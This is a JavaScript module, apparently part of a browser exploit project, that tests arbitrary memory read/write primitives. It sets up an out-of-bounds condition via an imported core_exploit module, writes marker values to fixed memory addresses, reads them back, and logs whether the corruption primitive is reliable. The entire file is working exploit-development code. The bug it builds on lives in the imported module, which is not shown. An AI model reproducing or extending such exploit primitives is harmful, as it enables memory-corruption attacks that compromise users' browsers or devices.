// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v30: Teste de Bloco com Reset Interno no Core)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    isOOBReady,
    arb_read,  // Do core_exploit.mjs v30 (async, com reset explícito interno)
    arb_write  // Do core_exploit.mjs v30 (async, com reset explícito interno)
} from '../core_exploit.mjs'; 

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v30_BlockRW_InternalResetCore";

// === Constantes ===
const BLOCK_ADDR_BASE_V30 = new AdvancedInt64(0x00000E00, 0x00000000);
const BLOCK_VAL_1_V30 = new AdvancedInt64(0xAAAAAAA1, 0x1111111A);
const BLOCK_VAL_2_V30 = new AdvancedInt64(0xBBBBBBB2, 0x2222222B);
const BLOCK_VAL_3_V30 = new AdvancedInt64(0xCCCCCCC3, 0x3333333C);
const BLOCK_ADDRS_V30 = [BLOCK_ADDR_BASE_V30, BLOCK_ADDR_BASE_V30.add(8), BLOCK_ADDR_BASE_V30.add(16)];
const BLOCK_VALS_V30 = [BLOCK_VAL_1_V30, BLOCK_VAL_2_V30, BLOCK_VAL_3_V30];

const PAUSE_BETWEEN_ARB_V30 = 100; // Pausa entre chamadas arb_write/arb_read no teste de bloco

let testLog_v30 = [];

function recordResult_v30(step, address, operation, valueWritten, valueExpected, valueReadObj) {
    let actualSuccess = false;
    const valueReadStr = isAdvancedInt64Object(valueReadObj) ? valueReadObj.toString(true) : (typeof valueReadObj === 'number' ? toHex(valueReadObj) : String(valueReadObj));
    const valueExpectedStr = (valueExpected === null || typeof valueExpected === 'undefined') ? "N/A" : (isAdvancedInt64Object(valueExpected) ? valueExpected.toString(true) : toHex(valueExpected));
    const valueWrittenStr = valueWritten ? (isAdvancedInt64Object(valueWritten) ? valueWritten.toString(true) : toHex(valueWritten)) : "N/A";
    const addressStr = address ? address.toString(true) : "N/A";

    if (valueExpected === null || operation.toLowerCase().includes("write only")) { actualSuccess = true; 
    } else if (isAdvancedInt64Object(valueExpected)) { actualSuccess = isAdvancedInt64Object(valueReadObj) && valueExpected.equals(valueReadObj);
    } else if (typeof valueExpected === 'number' && typeof valueReadObj === 'number') { actualSuccess = (valueExpected === valueReadObj);
    } else { actualSuccess = false; }
    
    const entry = { step, address: addressStr, operation, valueWritten: valueWrittenStr, valueExpected: valueExpectedStr, valueRead: valueReadStr, success: actualSuccess };
    testLog_v30.push(entry);
    const logType = actualSuccess ? "good" : "error";
    const statusMsg = actualSuccess ? "CORRETO" : "INCORRETO";
    logS3(`  [${step}] ${operation}: Addr=${entry.address}, Escrito=${entry.valueWritten}, Lido=${entry.valueRead}, Esperado=${entry.valueExpected} - ${statusMsg}`, logType, FNAME_MODULE_V28);
    return actualSuccess;
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testBlockRWWithInternalReset`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Bloco com Reset Interno no Core (v30) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;
    testLog_v30 = [];
    let overall_test_success = true; 
    let errorCapturedMain = null;
    let final_message = "Testes em execução...";

    try {
        await triggerOOB_primitive({ force_reinit: true }); // Inicializa o ambiente UMA VEZ
        if (!isOOBReady()) throw new Error("Ambiente OOB inicial principal não pôde ser configurado.");
        logS3("PASSO GLOBAL: Ambiente OOB inicial principal configurado.", "info", FNAME_CURRENT_TEST);

        // --- CENÁRIO ÚNICO: R/W em Bloco com Reset Explícito INTERNO ao core_exploit ---
        logS3("--- CENÁRIO ÚNICO: R/W em Bloco com Reset Explícito Interno ao Core ---", "subtest", FNAME_CURRENT_TEST);
        
        // Fase de Escrita do Bloco
        logS3("  FASE DE ESCRITA DO BLOCO:", "info", FNAME_CURRENT_TEST);
        for (let i = 0; i < BLOCK_ADDRS_V30.length; i++) {
            const current_address = BLOCK_ADDRS_V30[i];
            const value_to_write = BLOCK_VALS_V30[i];
            logS3(`    Escrevendo ${value_to_write.toString(true)} em ${current_address.toString(true)} (Item ${i})`, 'info', FNAME_CURRENT_TEST);
            await arb_write(current_address, value_to_write, 8); // arb_write agora é async e faz o reset interno
            
            // Leitura imediata para verificar (esta leitura também fará um reset interno)
            const read_after_write = await arb_read(current_address, 8);
            if(!recordResult_v30(`WriteRead.${i}`, current_address, `Write/Read Imediato Bloco Val ${i}`, value_to_write, value_to_write, read_after_write)) {
                overall_test_success = false;
            }
            await PAUSE_S3(PAUSE_BETWEEN_ARB_V30); // Pausa entre o tratamento de cada item do bloco
        }
        
        logS3("  FASE DE ESCRITA/LEITURA IMEDIATA DO BLOCO CONCLUÍDA.", "info", FNAME_CURRENT_TEST);
        logS3("  Pausa Longa (" + (PAUSE_BETWEEN_ARB_V30 * 3) + "ms) antes da leitura final do bloco...", "warn", FNAME_CURRENT_TEST);
        await PAUSE_S3(PAUSE_BETWEEN_ARB_V30 * 3);

        // Fase de Leitura do Bloco (Verificação Final)
        logS3("  FASE DE LEITURA FINAL DO BLOCO:", "info", FNAME_CURRENT_TEST);
        for (let i = 0; i < BLOCK_ADDRS_V30.length; i++) {
            const current_address = BLOCK_ADDRS_V30[i];
            const expected_value = BLOCK_VALS_V30[i];
            
            await PAUSE_S3(PAUSE_BETWEEN_ARB_V30); // Pausa antes de cada leitura final
            const final_read_value = await arb_read(current_address, 8);
            if(!recordResult_v30(`FinalRead.${i}`, current_address, `Read Final Bloco Val ${i}`, null, expected_value, final_read_value)) {
                overall_test_success = false;
            }
        }

        if (overall_test_success && testLog_v30.every(r => r.success)) {
            final_message = `SUCESSO! Bloco de dados escrito e lido corretamente com reset interno no core (v30).`;
        } else {
            final_message = `FALHA PARCIAL: Um ou mais passos no teste de bloco (v30) falharam.`;
            overall_test_success = false; 
        }
        logS3(`MSG FINAL DO CENÁRIO: ${final_message}`, overall_test_success ? "vuln" : "error", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28}: ${overall_test_success ? "V30 OK" : "V30 FALHA"}`;

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        final_message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
        overall_test_success = false; 
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Final Teste de Bloco com Reset Interno (v30): Success=${overall_test_success}, Msg='${final_message}'`, overall_test_success ? "good" : "warn", FNAME_CURRENT_TEST);
        testLog_v30.forEach(res => {
            const successString = res.success ? "OK" : `FALHA (Erro: ${res.error || 'Valor Incorreto'})`;
            logS3(`  [${res.step}] Addr=${res.address}, Op=${res.operation}, W=${res.valueWritten}, R=${res.valueRead}, E=${res.valueExpected} => ${successString}`, 
                  res.success ? "info" : "error", FNAME_MODULE_V28 + ".Details");
        });
    }
    return { errorCapturedMain, overall_test_success, final_message, test_log_details: testLog_v30 };
}
